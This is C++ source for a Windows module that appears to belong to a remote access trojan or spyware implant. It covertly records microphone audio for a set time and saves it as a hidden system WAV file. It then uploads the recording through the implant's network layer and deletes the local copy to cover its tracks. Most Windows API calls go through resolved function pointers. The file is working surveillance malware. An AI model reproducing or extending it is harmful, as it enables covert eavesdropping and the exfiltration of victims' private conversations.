/*
http://sdr-reu.wikispaces.com/file/view/SoundIn.c
File to read sound from sound card and record it to a file in PCM format.
*/

#include "SoundRecord.h"
#include <windows.h>
#include <mmsystem.h>
#include "../api.h"
#include "../public.h"
#include "../network/NetWorkdata.h"
#include "../log.h"
#include "../StrHelper.h"

#pragma comment(lib, "winmm.lib")





WAVEFORMATEX sampleFormat;
HMMIO        m_hFile;
MMCKINFO    m_MMCKInfoData;
MMCKINFO    m_MMCKInfoParent;
MMCKINFO    m_MMCKInfoChild;
char strFilePath[MAX_PATH] = { 0 };



int SendSoundRecord(char* szWavName)
{
	HANDLE hFile = lpCreateFileA(szWavName, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = lpSetFilePointer(hFile, 0, 0, FILE_BEGIN);
	if (iRet == INVALID_SET_FILE_POINTER)
	{
		lpCloseHandle(hFile);
		return FALSE;
	}

	DWORD dwFileSizeHigh = 0;
	DWORD dwFileSize = lpGetFileSize(hFile, &dwFileSizeHigh);

	DWORD dwCnt = 0;
	char* lpBuf = new char[dwFileSize + 0x1000];
	if (lpBuf == 0)
	{
		lpCloseHandle(hFile);
		return FALSE;
	}

	iRet = lpReadFile(hFile, lpBuf, dwFileSize, &dwCnt, 0);
	lpCloseHandle(hFile);
	if (iRet && dwCnt == dwFileSize)
	{
		iRet = uploadData(lpBuf, dwFileSize, SOUNDRECORD, szWavName);
	}

	delete[] lpBuf;
#ifndef _DEBUG
	lpDeleteFileA(szWavName);
#endif
	return TRUE;
}




void FreeBuffers(WAVEHDR* buffers)
{
	int x;
	for (x = 0; x < IN_BUFFERS_NUMBER; x++)
	{
		lpVirtualFree(buffers[x].lpData, 0, MEM_RELEASE); //zero meams all memory
	}
}



DWORD WINAPI waveInProc(void* threadControls)
{
	MSG msg;
	SoundThreadInfo* inFORMATION = (SoundThreadInfo*)threadControls;
	MMRESULT errorResult;
	int outputlenth = 0;

	while (lpGetMessageA(&msg, 0, 0, 0) == 1)             //得到一消息
	{
		if (msg.message == MM_WIM_DATA)
		{
			//printf("Data amount %d\n",((WAVEHDR *)msg.lParam)->dwBytesRecorded);
			//collect data
			if (inFORMATION->recordingStatus != 0) //recording not began or stopped只有0 ，-1 -2 三个值
			{
				if (inFORMATION->recordingStatus == REC_STATUS_ALL_DONE)
				{
					//printf("Possible error recieving WIM_DATA during condition ALL_DONE\n");
					break;  //time for thread to end
				}

				outputlenth = lpmmioWrite(m_hFile, ((WAVEHDR*)msg.lParam)->lpData, ((WAVEHDR*)msg.lParam)->dwBytesRecorded);
				if (outputlenth == ((WAVEHDR*)msg.lParam)->dwBytesRecorded)
				{
					//for debug
					int tmp = 0;
					//printf("sucsess save data_dwBytesRecorded %d\n",outputlenth);
					//printf("sucsess save data_dwBufferLength  %d\n",((WAVEHDR *)msg.lParam)->dwBufferLength);
				}

				//was this that last block the user wanted.
				if (inFORMATION->recordingStatus == REC_STATUS_FINISHING)
				{
					//the buffers are each sent back, but not requeue
					if (--inFORMATION->buffers_left == 0)
					{
						inFORMATION->recordingStatus = REC_STATUS_ALL_DONE;
					}
					//printf("Buffer finished.\n");
					continue;
				}
			}
			//if stopped it only requeue s the buffer and continues.requeue buffer
			if (!lpwaveInAddBuffer(inFORMATION->inWaveDevice, (WAVEHDR*)msg.lParam, SIZE_OF_WAVEHDR))
			{
				if (!lpwaveInAddBuffer(inFORMATION->inWaveDevice, (WAVEHDR*)msg.lParam, SIZE_OF_WAVEHDR))
				{
					//printf("Buffer requeue error.\n");
					if (--inFORMATION->buffers_left < 2)
					{
						FreeBuffers(inFORMATION->buffers);
						//printf("in requeue error device.");
						errorResult = lpwaveInClose(inFORMATION->inWaveDevice);
						if (errorResult)
						{
							//printf("Can't Close Wave Device!\n");
							//getchar();
						}
						return FALSE;
						inFORMATION->recordingStatus = REC_STATUS_FINISHING;
						//finishing means takes the queued blocks and no more in thoery the next block (the last one) that was queue previously
						lpmmioAscend(m_hFile, &m_MMCKInfoChild, 0);
						lpmmioAscend(m_hFile, &m_MMCKInfoParent, 0);
						return FALSE;
					}
				}
			}
		}
	}
	return TRUE;
}






int CreateWaveFile()
{
	MMRESULT    mmResult = 0;
	lpRtlZeroMemory((char*)&m_MMCKInfoParent, sizeof(MMCKINFO));
	lpRtlZeroMemory((char*)&m_MMCKInfoChild, sizeof(MMCKINFO));
	lpRtlZeroMemory((char*)&m_MMCKInfoData, sizeof(MMCKINFO));

	SYSTEMTIME stSt;
	lpGetLocalTime(&stSt);
	char strFileName[MAX_PATH];
	lpwsprintfA(strFileName, SOUNDCARD_RECORD_FILENAME, stSt.wYear, stSt.wMonth, stSt.wDay, stSt.wHour, stSt.wMinute, stSt.wSecond);


	int iRet = makeFullFileName(strFilePath, strFileName);
	m_hFile = lpmmioOpenA(strFilePath, NULL, MMIO_CREATE | MMIO_WRITE | MMIO_EXCLUSIVE | MMIO_ALLOCBUF);
	if (m_hFile == NULL)
	{
		return FALSE;
		//return getchar();
	}

	m_MMCKInfoParent.fccType = mmioFOURCC('W', 'A', 'V', 'E');
	mmResult = lpmmioCreateChunk(m_hFile, &m_MMCKInfoParent, MMIO_CREATERIFF);
	m_MMCKInfoChild.ckid = mmioFOURCC('f', 'm', 't', ' ');
	m_MMCKInfoChild.cksize = sizeof(WAVEFORMATEX) + sampleFormat.cbSize;
	mmResult = lpmmioCreateChunk(m_hFile, &m_MMCKInfoChild, 0);
	mmResult = lpmmioWrite(m_hFile, (char*)&sampleFormat, sizeof(WAVEFORMATEX) + sampleFormat.cbSize);
	mmResult = lpmmioAscend(m_hFile, &m_MMCKInfoChild, 0);
	m_MMCKInfoChild.ckid = mmioFOURCC('d', 'a', 't', 'a');
	mmResult = lpmmioCreateChunk(m_hFile, &m_MMCKInfoChild, 0);
	return TRUE;
}




int __stdcall SoundRecord(unsigned long DelayTime)
{
	unsigned long iDelayTime = DelayTime;
	//some client is without sound driver,that will cause some error
	//other module user only kernel32 user32 gdi32 gdiplus,this module is must be exist,can not occurr error
	try
	{
		MMRESULT errorResult = 0;
		SoundThreadInfo soundIn;
		HANDLE inWaveThreadHandle;                //线程
		int x = 0;                                //计数器
		soundIn.recordingStatus = 0;              //设置录音状态
		soundIn.buffers_left = IN_BUFFERS_NUMBER; //设置预期缓冲数量

		inWaveThreadHandle = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)waveInProc,/*参数*/ &soundIn, 0, (LPDWORD)&errorResult);   //创建线程
		if (!inWaveThreadHandle)
		{
			writeLog("SoundRecord lpCreateThread error\r\n");
			//printf("Can't create sound in thread! -- %08X\n",lpRtlGetLastWin32Error());
			return FALSE;
		}
		lpCloseHandle(inWaveThreadHandle);        //关闭线程

		for (x = 0; x < IN_BUFFERS_NUMBER; x++)   //清空缓存
		{
			ZeroMemory(&soundIn.buffers[x], SIZE_OF_WAVEHDR);
		}

		//设置 waveFormat
		sampleFormat.wFormatTag = WAVE_FORMAT_PCM;
		sampleFormat.nChannels = SOUND_RECORD_CHANNELS_NUMBER;  //声道
		sampleFormat.nSamplesPerSec = SOUND_RECORD_SAMPLES_PER_SEC;
		sampleFormat.wBitsPerSample = SOUND_RECORD_BITS_PER_SAMPLE;
		sampleFormat.nBlockAlign = sampleFormat.nChannels * (sampleFormat.wBitsPerSample >> 3);
		sampleFormat.nAvgBytesPerSec = sampleFormat.nSamplesPerSec * sampleFormat.nBlockAlign;

		if (!CreateWaveFile())
		{
			writeLog("SoundRecord CreateWaveFile error\r\n");
			return FALSE;
		}

		//分配 memory sound in buffers.
		for (x = 0; x < IN_BUFFERS_NUMBER; x++)  //this loop is not need after testing
		{                                        //can be replaced with hard coded buffer allocation
			//clear waveheaders
			ZeroMemory(&soundIn.buffers[x], SIZE_OF_WAVEHDR);
			soundIn.buffers[x].dwBufferLength = sampleFormat.nAvgBytesPerSec * iDelayTime;  //内存大小估计一块
			soundIn.buffers[x].dwFlags = 0;
			soundIn.buffers[x].lpData = (char*)lpVirtualAlloc(NULL, soundIn.buffers[0].dwBufferLength, MEM_COMMIT, PAGE_READWRITE);  //申请内存

			if (soundIn.buffers[x].lpData == NULL)
			{
				//printf("Sound In Buffer number %d failed to get allocate memory.\n",x);
				for (--x; x; x--) // start 1 down, and while x!=0 x--
				{
					lpVirtualFree(soundIn.buffers[x].lpData, 0, MEM_RELEASE); //释放内存
				}
				writeLog("SoundRecord buffers error\r\n");
				return FALSE;
			}
			else
			{
				//printf(" %d Buffer Application  sucsess\n",x);
			}
		}

		//open wave device
		errorResult = lpwaveInOpen(&soundIn.inWaveDevice, WAVE_MAPPER, &sampleFormat, (DWORD)errorResult, 0, CALLBACK_THREAD);
		if (errorResult != MMSYSERR_NOERROR)
		{
			writeLog("SoundRecord lpwaveInOpen error\r\n");
			FreeBuffers(soundIn.buffers);
			//return getchar();
			return FALSE;
		}

		// buffers and queue them
		for (x = 0; x < IN_BUFFERS_NUMBER; x++)
		{
			errorResult = lpwaveInPrepareHeader(soundIn.inWaveDevice, &soundIn.buffers[x], SIZE_OF_WAVEHDR);
			if (errorResult != MMSYSERR_NOERROR)
			{
				//printf("Failed to prepare header %d. Error %d\n",x,errorResult);
				FreeBuffers(soundIn.buffers);
				errorResult = lpwaveInClose(soundIn.inWaveDevice);
				if (errorResult)
				{
					//printf("Can't Close Wave Device!\n");
					//getchar();
				}
				writeLog("SoundRecord lpwaveInPrepareHeader error\r\n");
				return FALSE;
			}

			errorResult = lpwaveInAddBuffer(soundIn.inWaveDevice, &soundIn.buffers[x], SIZE_OF_WAVEHDR);
			if (errorResult != MMSYSERR_NOERROR)
			{
				//printf("Failed to queue wave buffer %d.\n",x);
				soundIn.buffers_left--;
				if (soundIn.buffers_left < 2)
				{
					FreeBuffers(soundIn.buffers);
					errorResult = lpwaveInClose(soundIn.inWaveDevice);
					if (errorResult)
					{
						//printf("Can't Close Wave Device!\n");
						//getchar();
					}

					writeLog("SoundRecord lpwaveInAddBuffer error\r\n");
					return FALSE;
				}
			}
		}
		//set record flag
		//printf("Hit any key to begin recording.\n");
		//getchar();
		soundIn.recordingStatus = 1;  //1 == starting recording

		//start recording
		errorResult = lpwaveInStart(soundIn.inWaveDevice);
		if (errorResult == MMSYSERR_NOERROR)
		{
			//wait for user to stop recording
			//printf("Hit any key to stop recording.\n");
			//getchar();
			soundIn.recordingStatus = REC_STATUS_FINISHING;
		}
		else
		{
			//Recording never started.
			soundIn.recordingStatus = REC_STATUS_ALL_DONE;
		}

		//lpSleep(iDelayTime*1000);
		unsigned int iWaitCnt = 0;
		while (TRUE)
		{
			lpSleep(1000);
			iWaitCnt++;
			if (iWaitCnt >= iDelayTime)
			{
				break;
			}
		}

		//reset headers
		lpwaveInReset(soundIn.inWaveDevice); //this should send a MM_WIM_DONE for each of the buffers/headers

		//wait thread
		while ((soundIn.recordingStatus != REC_STATUS_ALL_DONE)) //status -2 is finished
		{
			lpSleep(1000); //tenth of a second
			//printf("Waiting for all done.\n");
			//printf("Recording status = %d\n",soundIn.recordingStatus);
		}

		//un prepare the buffers
		for (x = 0; x < IN_BUFFERS_NUMBER; x++)
		{
			errorResult = lpwaveInUnprepareHeader(soundIn.inWaveDevice, &soundIn.buffers[x], SIZE_OF_WAVEHDR);
			if (errorResult != 0)
			{
				//printf("Failed to unprepare wave header.\n");
			}
		}
		//deallocate memory
		FreeBuffers(soundIn.buffers);

		lpmmioAscend(m_hFile, &m_MMCKInfoChild, 0);
		lpmmioAscend(m_hFile, &m_MMCKInfoParent, 0);

		//close wave device
		errorResult = lpwaveInClose(soundIn.inWaveDevice);
		if (errorResult)
		{
			//printf("Can't Close Wave Device!\n");
			//getchar();
		}

		lpmmioClose(m_hFile, 0);
		//return getchar();

		SendSoundRecord(strFilePath);
		return TRUE;
	}
	catch (...)
	{
		writeLog("SoundRecord exception\r\n");
		return FALSE;
	}
}




